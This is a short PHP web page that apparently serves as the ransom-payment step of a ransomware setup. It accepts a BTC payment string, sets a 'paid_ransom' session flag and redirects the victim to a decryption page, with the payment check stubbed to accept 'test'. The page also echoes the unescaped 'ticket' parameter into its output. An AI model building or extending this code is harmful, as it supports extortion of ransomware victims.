<!DOCTYPE HTML>
<html>
<head>
	<title>Payment Page</title>
	<link rel="stylesheet" href="style/main.css">
</head>
<body>
	<div class='midcenter'>
	<?php
		if(array_key_exists("btc_payment",$_POST)){
			//Check validity of payment
			if($_POST["btc_payment"]=="test"){
				//Start session
				session_start();
				unset($_SESSION);
				session_destroy();
				session_start();
				$_SESSION["timeout"]=time();
				$_SESSION["paid_ransom"]=true;
				
				//Redirect to Decryption
				header("Location: decrypt.php?ticket=".$_GET["ticket"]);
				
				
			}else{
				echo("<div class='alert'>Invalid Payment</div>");
			}
		}
	?>
	<form method="POST" action=<?php echo("?ticket=".$_GET["ticket"]);?>>
		BTC Payment: <input name="btc_payment" type="text"><br/>
		<input type="submit">
	</form>
	</div>
</body>
</html>